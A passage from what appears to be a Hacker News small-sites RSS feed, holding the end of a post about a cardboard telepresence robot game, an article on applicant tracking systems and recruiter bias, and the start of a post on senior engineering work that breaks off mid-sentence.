<p><img alt="Looping video of a close up of a cardboard fist punching a cardboard Nazi" src="https://cdn.shopify.com/s/files/1/1041/4014/files/PunchCloseUp1_1024x1024.gif?v=1598351227"></p>
<p>I used to live&nbsp;around the corner from&nbsp;the <a href="https://www.theguardian.com/artanddesign/2016/sep/25/the-full-history-of-the-cable-street-mural">Cable Street mural</a>,&nbsp;which&nbsp;is a great argument for punching Nazis, so this seemed good. I&nbsp;designed a compact 3D printed Smartibot chassis that could hold a smartphone and a 9g servo to operate the punch mechanism, to which I attached a nice pixelated fist. (files on Thingiverse).</p>
<h2>A game engine on your table</h2>
<p>I got a friend who's worked for many years creating computer games&nbsp;to test this out and she said "you've made a game engine", which wasn't really something I'd considered before but it makes sense.</p>
<p>Game engines (software frameworks that handle things like in-game physics and graphics) have allowed games producers to focus on the creative aspects of game making and opened up the field to many less technical people.</p>
<p>Using a small telepresence robot (like Smartipresence) in this way&nbsp;makes game creation even easier, all you need is a table (or bit of floor) to build your environment on, some things for the player to interact with and a clear idea of how the game mechanics should work. The physical world provides your physics and graphics engine and your hands handle the game mechanics.</p>
<p>I think this could be a <strong>really fun</strong> way for kids to interact with their loved ones remotely.</p>
<p><img alt="Looping video of a small purple circuit board with a smiling face on it connected to 14 motors all of which are moving back and fourth" src="https://cdn.shopify.com/s/files/1/1041/4014/files/AllTheMotors_1024x1024.gif?v=1598352223"></p>
<p>The robot I&nbsp;built to play Smartistein3D uses only three motors (the two that come in the Smartibot kit to drive the wheels and move it around plus the little servo for the punch) but because Smartibot is so flexible (and can control up to 14 motors) you could build more complicated robots for more complicated game mechanics (you could use almost any of the robots in the projects section as the character). Plus, if you've got&nbsp;strong enough internet, there's no reason not to have multiple players controlling multiple robots. ALSO, you could probably use <a href="https://thecraftyrobot.net/blogs/projects/simple-programming-with-the-a-i-getting-your-smartibot-to-run-away-from-people-but-still-chase-other-things" title="Smartibot A.I. programming">Smartibot's A.I.</a> mode to create enemies that move around and respond to the player characters automatically ... I&nbsp;doubt&nbsp;this&nbsp;will the last game I'll make with Smartipresence.</p>


    </div></div>]]>
            </description>
            <link>https://thecraftyrobot.net/blogs/projects/cardboard-wolfenstein-3d-telepresence-robot-fp-nazi-punch-game</link>
            <guid isPermaLink="false">hacker-news-small-sites-24277779</guid>
            <pubDate>Wed, 26 Aug 2020 00:17:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You're not landing job interviews thanks to new technologies]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24277713">thread link</a>) | @hollaur
<br/>
August 25, 2020 | https://www.thevectorimpact.com/how-to-apply-for-jobs-online/ | <a href="https://web.archive.org/web/*/https://www.thevectorimpact.com/how-to-apply-for-jobs-online/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

						
						<article id="post-2564">

							
							<section itemprop="articleBody">

								
<span itemprop="reviewBody"><p><i><span><img title="how to apply for jobs online 2020 meme" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-2020-meme.jpg" alt="meme: &quot;When does season 2 of 2020 start? I do not like season 1.&quot;" width="1200" height="1200" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-2020-meme.jpg 1200w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-2020-meme-300x300.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-2020-meme-1024x1024.jpg 1024w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-2020-meme-150x150.jpg 150w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-2020-meme-768x768.jpg 768w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-2020-meme-125x125.jpg 125w" sizes="(max-width: 1200px) 100vw, 1200px">Can I get an Amen?</span></i></p>
<p>Whether you’re lucky enough to be employed or currently out of work, it’s no secret that <strong>landing a job in 2020 is harder than ever before.</strong></p>
<p><span>And while it’s easy to blame coronavirus and wallow in our job-seeker sorrow—and believe me, I’m not ignoring the very real challenges of our current economy—my research suggests there’s more to it than that.</span></p>
<p><span>A friend of mine had been applying to jobs prior to the pandemic, and he hadn’t landed a single interview.&nbsp;</span></p>
<p><span>I thought I’d have the solution to his problem in all of five minutes (I used to be </span>p<span>retty good at applying for jobs online</span><span>), but it turns out he was already doing everything </span><i><span>“right.”</span></i><span>&nbsp;</span></p>
<p><span>His resume listed quantified bullet point after quantified bullet point. The formatting looked good. He tailored his cover letters to the position descriptions. His online presence is superb; he owns the front page of Google results for his name. And LinkedIn rated his profile as an “All-Star.” Oh yeah, he’s also gainfully employed.</span></p>
<p><span>You might be thinking, “Well, if he applied through job boards, that’s his first problem.”&nbsp;</span></p>
<p><span>And I’m thinking, “He used to apply through job boards and land interviews more than 60 percent of the time just a few years ago, so what’s changed?”&nbsp;</span></p>
<p><span>Turns out, A LOT. And I would’ve never known if it wasn’t for my friend stumping me with his seemingly simple quandary. I’m flabbergasted by how out of touch I was with the modern job hunt, which is why I couldn’t </span><b>not</b><span> write this post.&nbsp;</span></p>
<p><strong>With the average job tenure lasting just one year on average, it’s extremely likely you’ll need to understand <i>why</i> in the near future.&nbsp;</strong></p>
<p><span>I wrote this post to demystify the modern recruiting process and help qualified candidates figure out how to apply for jobs online. So if you’re ready to make it past the initial resume screening process and score an interview—and ultimately land the opportunity you deserve—then keep reading.</span></p>

<h2><span id="Why_is_landing_a_job_so_hard"></span><span>Why is landing a job so hard?</span><span></span></h2>
<p><span><img title="how to apply for jobs online landing a job is hard" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-landing-a-job-is-hard.jpg" alt="" width="1200" height="600" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-landing-a-job-is-hard.jpg 1200w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-landing-a-job-is-hard-300x150.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-landing-a-job-is-hard-1024x512.jpg 1024w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-landing-a-job-is-hard-768x384.jpg 768w" sizes="(max-width: 1200px) 100vw, 1200px">Yes, we’re in the midst of a <a href="https://www.npr.org/series/812054919/the-coronavirus-crisis">global pandemic</a> and <a href="https://fortune.com/2020/07/12/how-is-us-economy-doing-2020-recession-unemployment-rate-benefits-consumer-spending-job-losses-state-by-state-pmi-coronavirus-pandemic/">record unemployment</a>, and that undoubtedly makes the job market more competitive than ever.&nbsp;</span></p>
<p><span>Yet, even prior to the world turning upside down, the lamest of job ads received an insane amount of applications. The consensus seems to be about </span><a href="http://www.inc.com/peter-economy/19-interesting-hiring-statistics-you-should-know.html"><span>250 applications per job listing</span></a><span>, on average.&nbsp;</span></p>
<p><span><img title="how to apply for jobs online job applications 02" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-job-applications-02.png" alt="Breaking down job applications infographic. Out of 250 applications, 4-6 will be interviewed, and only 1 will receive an offer." width="2084" height="1244" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-job-applications-02.png 2084w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-job-applications-02-300x179.png 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-job-applications-02-1024x611.png 1024w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-job-applications-02-768x458.png 768w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-job-applications-02-1536x917.png 1536w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-job-applications-02-2048x1223.png 2048w" sizes="(max-width: 2084px) 100vw, 2084px">Of course, super-competitive positions get a lot more… supposedly anyway.&nbsp;</span></p>
<p><span><a href="https://twitter.com/jasonfried/status/1147166154089213953"><img title="how to apply for jobs online jason fried tweet" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-jason-fried-tweet.jpg" alt="tweet by Jason Fried: &quot;Out of everyone who applied for the Basecamp Head of Marketing job, only one person used an ad on LinkedIn to get an extra ounce of notice.&quot;" width="1000" height="802" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-jason-fried-tweet.jpg 1000w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-jason-fried-tweet-300x241.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-jason-fried-tweet-768x616.jpg 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a>And you know what they say… </span><b>ain’t no recruiter got time for that.</b></p>



<p><strong>But seriously, <i>they don’t</i></strong><span>—not in a metrics-driven world, where companies are obsessed with automating everything to do things as fast as possible, even at the cost of quality.&nbsp;</span></p>

<h3><span id="Applicant_Tracking_Systems_What_you_need_to_know"></span><span>Applicant Tracking Systems: What you need to know</span><span></span></h3>
<p><span><img title="how to apply for jobs online applicant tracking systems" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-applicant-tracking-systems.jpg" alt="" width="1000" height="667" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-applicant-tracking-systems.jpg 1000w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-applicant-tracking-systems-300x200.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-applicant-tracking-systems-768x512.jpg 768w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-applicant-tracking-systems-360x240.jpg 360w" sizes="(max-width: 1000px) 100vw, 1000px">Enter the </span><span><a href="https://www.reportsanddata.com/report-detail/applicant-tracking-system-ats-market">$1.3 billion recruiting technology/software industry</a>.&nbsp;</span></p>
<p><span>While there are a variety of modern recruitment tools for each stage of the hiring process, the one that will affect you the most is the </span><a href="https://fairygodboss.com/career-topics/applicant-tracking-systems"><span>Applicant Tracking System (ATS)</span></a><span>.&nbsp;</span></p>
<p><span><img title="how to apply for jobs online 2020 applicant tracking system process 02" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-2020-applicant-tracking-system-process-02.png" alt="Applicant tracking system process" width="2085" height="3088" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-2020-applicant-tracking-system-process-02.png 2085w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-2020-applicant-tracking-system-process-02-203x300.png 203w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-2020-applicant-tracking-system-process-02-691x1024.png 691w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-2020-applicant-tracking-system-process-02-768x1137.png 768w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-2020-applicant-tracking-system-process-02-1037x1536.png 1037w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-2020-applicant-tracking-system-process-02-1383x2048.png 1383w" sizes="(max-width: 2085px) 100vw, 2085px">It’s pretty much guaranteed that your application is going through an ATS any time you apply for a job online, since at least </span><a href="https://www.jobscan.co/blog/fortune-500-use-applicant-tracking-systems/"><span>98 percent of Fortune 500 companies use one</span></a><span>.&nbsp;</span></p>
<p><span>TLDR: ATS help recruiters/hiring managers collect, sort, and organize a large number of applications.&nbsp;</span></p>

<h4><span>Most Common ATS Features</span></h4>
<p><span>Rather than manually reviewing each resume, recruiters and hiring managers search for resumes based on keywords, or have the system filter or automatically rank applicants.&nbsp;</span></p>
<p><span>In many cases, recruiters use the technology to do a first pass of resumes, meaning you can be removed from consideration </span><b>by an algorithm without ever being reviewed by a human</b><span>.&nbsp;</span></p>
<p><span><img title="how to apply for jobs online what happens to your resume ats 02" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02.png" alt="Infographic: What happens to your resume in an applicant tracking system" width="2501" height="10553" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02.png 2501w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02-71x300.png 71w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02-243x1024.png 243w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02-768x3241.png 768w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02-364x1536.png 364w" sizes="(max-width: 2501px) 100vw, 2501px">While there </span><a href="https://blog.ongig.com/applicant-tracking-system/top-ats-systems-used-by-the-fortune-500-2019"><span>hundreds of ATS on the market</span></a><span>, most of them list the same features. Understanding them is key to landing an interview. Here are the big ones that will determine whether a human ever sees your resume.</span></p>

<h5><span>Automatic Applicant Ranking/Scoring</span></h5>
<p><span>Many ATS provide an automatic “match rank” or score for each applicant.&nbsp;</span><span><a href="https://www.jobscore.com/features/submit-resume/"><img title="how to apply for jobs online ats ranking scoring" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring.jpg" alt="candidate match score example on Job Score website" width="982" height="400" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring.jpg 982w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-300x122.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-768x313.jpg 768w" sizes="(max-width: 982px) 100vw, 982px"></a>The system will take and parse the information from your resume, and compare it with the job description, looking for specific keywords, then provide a score from 0 to 100, or one to 10, that tells recruiters how qualified a candidate is for said job, based on the criteria set by the hiring manager.&nbsp;</span></p>
<p><span><a href="https://www.jobscore.com/features/submit-resume/"><img title="how to apply for jobs online ats ranking scoring 02" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-02.jpg" alt="ATS extracts contact info, employment and education history from resumes" width="1000" height="420" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-02.jpg 1000w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-02-300x126.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-02-768x323.jpg 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a>They’ll also score you based on the answers you submit via the online form, aka “knockout questions.”&nbsp;</span></p>
<p><span><a href="https://www.jobscore.com/features/submit-resume/"><img title="how to apply for jobs online ats ranking scoring 03" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-03.jpg" alt="Job Score website, qualifying questions" width="1000" height="763" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-03.jpg 1000w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-03-300x229.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-03-768x586.jpg 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a></span></p>
<p><span>For example, job posts that ask for your location are likely using that information as a filter that will alter your overall qualification score.&nbsp;</span></p>

<h5><span>Comprehensive Candidate Profiles</span></h5>
<p><span>Many ATS will automatically create a comprehensive, wildly detailed profile of you based on your digital footprint and other “public” information. All they need is your email address to populate every piece of available content about you online.&nbsp;</span></p>
<p><span>According to </span><a href="https://resources.workable.com/tutorial/important-applicant-tracking-system-features"><span>Workable</span></a><span>, aggregating candidates’ public information is a way to “humanize” the process, and they list it as a must-have feature for today’s ATS. Here’s how they describe it:</span></p>
<p><i><span>“I want to see faces dammit. And tweets. And maybe other stuff that humanizes this record.”</span></i></p>
<p><span>(In my opinion, that’s just a recipe for complete and total bias, as we know </span><a href="https://www.crowdstaffing.com/blog/hidden-bias-that-affect-the-hiring-process"><span>there’s A LOT of it in recruiting</span></a><span>, even if it’s subconscious.)&nbsp;</span></p>
<p><span>Many <a href="https://www.entelo.com/products/platform/search/">recruitment tools</a> even go so far as to make predictions about candidates based on the information they surface about them online.&nbsp;</span></p>
<p><a href="https://www.entelo.com/products/platform/search/"><span><img title="how to apply for jobs online ats candidate profiles" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-candidate-profiles.png" alt="Profile of senior product designer at Acme and predictions about his performance, fit, and longevity." width="1010" height="958" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-candidate-profiles.png 1010w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-candidate-profiles-300x285.png 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-candidate-profiles-768x728.png 768w" sizes="(max-width: 1010px) 100vw, 1010px"></span></a></p>
<p><span>In </span><a href="https://recruitingtools.com/boolean-strings-network/"><span>one of the first posts I read by a recruiter</span></a><span> on this topic, she tells hiring managers to search data enrichment tools/databases, like Pipl, Jigsaw and Zoominfo.&nbsp;</span></p>
<p><span>Pipl’s main use case is for “investigations.”&nbsp;</span></p>
<p><i><span>“</span></i><a href="https://pipl.com/investigation-and-research"><i><span>Pipl’s identity resolution engine</span></i></a><i><span> cross-references global data from the Internet, public records, listings, directories, archives and exclusive sources to show the connections between people and the world.”</span></i></p>
<p><span>ZoomInfo is more for B2B data enrichment. Check out the screenshot below to see how they collect your information.&nbsp;</span></p>
<p><span><a href="https://www.zoominfo.com/business/our-data?utm_campaign=branded"><img title="how to apply for jobs online candidate profiles zoominfo 02" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-candidate-profiles-zoominfo-02.jpg" alt="ZoomInfo" width="1000" height="899" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-candidate-profiles-zoominfo-02.jpg 1000w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-candidate-profiles-zoominfo-02-300x270.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-candidate-profiles-zoominfo-02-768x690.jpg 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a>Pretty scary, huh?&nbsp;</span></p>

<h5><span>Resume Parsing</span></h5>
<p><span>This is sort-of a feature of the “Automatic Applicant Ranking/Score” section, but it’s also important to mention on its own.&nbsp;</span></p>
<p><span>Resume parsing refers to how ATS extracts and organizes your resume into “structured data,” so they can do stuff like rank/score you automatically.&nbsp;</span></p>
<p><span>This means that many times submitting a PDF, or using creative typography, will hurt you, because the ATS can’t read the data well, if at all.&nbsp;</span></p>

<h5><span>Resume Storage</span></h5>
<p><span>Even if you’re rejected for a position, the ATS will store your resume in its system, because every time there’s a new role to fill, they’ll start with searching their databases to see who might be a match, which leads me to the next feature.&nbsp;</span></p>

<h5><span>Search and Filters</span></h5>
<p><span>ATS allows hiring managers to search by any keyword, and often with </span><a href="https://recruitingtools.com/boolean-strings-network/"><span>Boolean search</span></a><span>, which connects keywords using AND, OR, NOT and NEAR.</span></p>
<p><span>Some tools will even let you filter by those it labels “not job hoppers,” etc.&nbsp;</span></p>
<p><span>Filters may include the job seeker’s location, application source, age of your profile, and whether or not you’re an employee referral.&nbsp;</span></p>

<h4><span>Recruiters’ dirty little secrets&nbsp;</span></h4>
<h5><span>Backchanneling / Backdoor references</span></h5>
<p><span>If the recruiter actually sees your resume and is interested in interviewing you, she’ll likely visit your LinkedIn profile to make sure everything checks out.&nbsp;</span></p>
<p><span>She may even message any mutual connections you have to see what they’ll say about you. This is illegal but it happens all the time from </span><a href="https://www.glassdoor.com/blog/8-secrets-recruiters-wont-tell-you/"><span>what I read</span></a><span>.</span></p>
<p><i><span>“This phenomenon is even more prevalent in the last five years or so because of LinkedIn’s growing popularity. Even if you choose not to give anybody there as a reference, backdoor references can reveal the skeletons in your closet. Backdoor references can be especially common when you’re looking for a job in sectors like tech.”</span></i></p>

<h5><span>Cyberstalking</span></h5>
<p><span>Another potentially discriminatory and sometimes illegal practice includes cyberstalking you.&nbsp;</span></p>
<p><i><span>“A lot of recruiters—most that I know—will Google candidates who make it pretty far [in the hiring process], and then use Google image results, and also blog posts, tweets, and open Facebook accounts to judge someone’s character and credibility.” (</span></i><a href="https://www.fastcompany.com/40441093/former-recruiters-reveal-the-industrys-dark-secrets-that-cost-you-job-offers"><i><span>Source</span></i></a><i><span>)</span></i></p>

<h5><span>[Subconscious] Bias</span></h5>
<p><span>Whether it’s subconscious or downright discriminatory, hiring managers usually have a </span><a href="https://www.fastcompany.com/40441093/former-recruiters-reveal-the-industrys-dark-secrets-that-cost-you-job-offers"><span>preconceived picture</span></a><span> of what the perfect candidate looks like, which often is based on stereotypes.</span></p>

<p><b>Bias 1: Being overweight</b></p>
<p><span>Weight bias is still especially prevalent, according to one recruiter, who says being overweight can make people think the person is lazy or lacks motivation.</span></p>

<p><b>Bias 2: “Diversity”</b></p>
<p><span>“Diversity in Silicon Valley’s mind is the picture of Phylicia Rashad,” (the actress who portrayed Clair Huxtable on The Cosby Show), said another recruiter </span><a href="https://www.fastcompany.com/40441093/former-recruiters-reveal-the-industrys-dark-secrets-that-cost-you-job-offers"><span>via the same article</span></a><span>.&nbsp;</span></p>
<p><span>According to the post, she sees African-American women considered more readily for roles as diversity/inclusion chiefs, while white men more often lead the pack to head up sales teams.</span></p>
<p><span>Another recruiter bolsters her experience:&nbsp;</span></p>
<p><i><span>“There’s a penchant to see more diversity, but the definition is narrow,” typically reduced to race and gender; it was common to tout a candidate for being a “visible minority.” “It’s the only way to highlight that for the client on a call,” he explains, since “we can’t put it in our documentation.”</span></i></p>

<p><b>Bias 3: Looking “too young”&nbsp;&nbsp;</b></p>
<p><span>The same recruiter from above said he also sees a lot of ageism in the hiring process.&nbsp;</span></p>
<p><span>For example, there’s kind-of a sweet spot in terms of age for C-level positions, he said.&nbsp;</span></p>
<p><span>“My boss would say things like, ‘Did they have enough gray hair?’—not literally, but are they seasoned enough, do they have enough experience where they could be credible?”&nbsp;</span></p>
<p><span>There were occasions when recruiters would nominate younger, well-qualified candidates for senior leadership roles, Mark recalls, but “I’d say 20% of the time they’re open to meeting with that person.”</span></p>

<p><b>Bias 4: Expensive degrees</b></p>
<p><span>At the beginning of the recruitment process, recruiters are dealing with so many resumes that they use a prestigious degree as a quick way to filter down the candidate pool.&nbsp;</span></p>
<p><span>According to a recruiter from that FastCompany article I mentioned …</span></p></span></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.thevectorimpact.com/how-to-apply-for-jobs-online/">https://www.thevectorimpact.com/how-to-apply-for-jobs-online/</a></em></p>]]>
            </description>
            <link>https://www.thevectorimpact.com/how-to-apply-for-jobs-online/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24277713</guid>
            <pubDate>Wed, 26 Aug 2020 00:06:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What's it like as a Senior Engineer?]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24277414">thread link</a>) | @benkwokcy
<br/>
August 25, 2020 | https://www.zainrizvi.io/blog/whats-it-like-as-a-senior-engineer/ | <a href="https://web.archive.org/web/*/https://www.zainrizvi.io/blog/whats-it-like-as-a-senior-engineer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			<!-- .cover -->


				<div>
					<p>When I started working at Microsoft, fresh out of college, coding was my life. Writing code was the easiest way to build any cool thing that my brain could imagine. &nbsp;When I thought about what I’d want to do for the rest of my life I thought that I just wanted to keep coding. </p><p>During the next 11 years I became a Senior Engineer at Microsoft and moved on to work at Google and later Stripe. At these higher levels I still get to build, but I use a very different set of tools to do it. There’s a huge mindset shift needed when you go from junior to senior. Writing code becomes a minor part of the job. </p><p>Ever built a tool no one used? I have. It sucked. At the senior levels most of your time goes into identifying <strong>what </strong>needs to be built and <strong>how </strong>to build it. You have to research what the problem looks like. You talk to others and get everyone to agree on what needs to be done. </p><p>These are your new tools:</p><ul><li>Research the problem</li><li>Design the solution</li><li>Build consensus</li></ul><h2 id="research-like-a-detective">Research like a Detective</h2><p>Fresh out of college you get handed tasks where the right answer is pretty straightforward. There isn’t much disagreement on what to do other than the occasional feedback in code reviews.</p><p>As you get more experienced your problems become more ambiguous. The path looks hazy. There are multiple routes you could take, but each one hides its own dragons. It’s not about coding anymore. Most of your work goes into research, and you can’t google the answer.</p><p>Research can take many forms. It usually involves a combination of reading code, reading documentation, and talking to people. Yes, actual human beings. In fact, that’s where most of the information you’ll need is locked away. Did you ever see Sherlock Holmes using search engines? </p><figure><img src="https://lh3.googleusercontent.com/8zyhAq2HSKAYAzysnJfbR_m6ZCBloCL5jbUmlwLEnJnmErsiHzd6gOEPtMpJZIp961AlNxUrdloY4B3cFFpVca5iH7Xb3wJgj0rFG7TLO60IGey4TaOJGZITimTXGv7U9hXqh-Pp" alt=""></figure><p>There often is no single person who knows the answer you need. Five different people might hold five different pieces of the puzzle you’re assembling. And you don’t know who those five people are. And they don’t know which pieces you need.</p><p><em>You </em>have to find them. Find them and ask the right questions to sift through their brains, uncovering the nuggets you need.</p><h6 id="sifting-for-nuggets">Sifting for nuggets</h6><p>At Google Cloud Platform, customers would often contact the Technical Solutions Engineers for help when they ran into issues. Those TSEs dug into the problems and fixed them. </p><p>My manager had an idea: “Wouldn’t it be great if we could use AI to automate that process?” We had no clue how to do it. Didn’t even know if it was possible. Heck, we weren’t even sure what kind of problems customers were asking for help with. But that was the challenge my manager offered.</p><p>I accepted.</p><p>Now any AI solution for this kind of a problem requires lots of data. The AI needs to see many broken environments to understand what they look like. And as I searched around I realized we didn’t have that data, it was all locked away in the brains of those TSEs. You can’t train AI with that. </p><p>I had to find the patterns. Maybe chatting with the TSEs would reveal something...</p><p>Me: “So, what type of problem do you usually face?”</p><p>TSE: “Eh, it’s something different every time”</p><p>Darn it, The AI future was looking bleak. </p><p>Me: “Well, what do you do to solve it?”</p><p>TSE: “It depends. Based on the problem, we’ll query one database or another. Then that’ll point us somewhere else, and we keep digging until we find what’s wrong. Then we fix it.”</p><p>No solid data on what problems they solve. No repeatable way to fix them. I was ready to give up.</p><p>Wait a second.</p><p>“Tell me more about these queries you run?”</p><p>What if I changed the problem? Maybe I didn’t have to fix those customer issues right off the bat. What if I helped TSEs debug the problems faster? I could automatically run the hundreds of queries they might run and suggest “Hey, this one had a suspicious result. Maybe dig a bit deeper there?” That’s a lot of debugging the TSEs could avoid.</p><p>I could even extend this to collect the data needed for an actual an AI system. This had potential! The TSEs were excited. My team was excited. My manager was excited. We began coding.</p><h2 id="design-the-art-of-balance">Design: The Art of Balance</h2><p>With ambiguous problems there is no single right answer anymore. There might not be any answer. What you have is a pain point. It could be your customers’s pains, your team’s pains, or even your own pain. The existence of that pain is the problem. Your job is to remove that pain without introducing even greater pains.</p><p>There’s a funny thing about ambiguous problems: they don’t have a clear right answer. Every solution offers certain benefits and has certain downsides. The more of those you discover, the better you’ll be at balancing the tradeoffs you have to make. Some common trade offs to consider:</p><ul><li>How long will it take to develop the solution?</li><li>What’s the opportunity cost?</li><li>How risky is it? What happens if that thing fails?</li><li>How much work will it be to maintain this going forwards?</li><li>How far will it scale? How far does it need to?</li></ul><p>With these ambiguous problems, sometimes the best answer can be “keep doing the thing we’ve been doing.” That was a tough lesson to learn. </p><h6 id="young-and-naive">Young and Naive</h6><p>When I was a wee lad four years out of college, I had been asked to come up with a way to make our database upgrades less risky. The team would manually review all the planned changes to make sure they were safe, but once in a while a bug would slip though and the sound of pagers going off would fill the room as everyone frantically tried to fix it.</p><p>“Can we build a tool to catch those risky changes?” my manager asked me. Woah, this was a super open ended problem. Sweet! I was determined to not let him down. This required digging deep into database upgrade best practices (I even read a whole <a href="https://martinfowler.com/books/refactoringDatabases.html">book on it</a> cover to cover). I spent the winter holidays toiling away developing a prototype that could do upgrades safely. And it worked! Kinda.</p><p>When I showed my creation to my manager he was worried: “You know what, let’s just stick with doing things the way we do right now.” </p><p>Ouch. </p><p>It was a tough lesson on risk management, but he made the right call. A bug in my tool could have brought our entire service down. It wasn’t worth the risk.</p><figure><img src="https://lh6.googleusercontent.com/-SpPwF1sWOPZD0HnYx0IqqluusAVritix1g7_NToe3s93jEmkPTsYhCTHJdPh7axMdLIN6gZ0fJ1_01AiPDputH2wPnMBXTDmgfxYIFAicsQeyAlq8Y9fRTxBFljmx9FZYi1Pdcy" alt=""></figure><p>There were multiple lessons I learned that day:</p><ul><li>Consider how much risk any new project might add to the system</li><li>It’s okay to fail. If you never fail then you’re not stretching yourself</li><li>Get feedback early! </li></ul><p>To get that feedback communication is 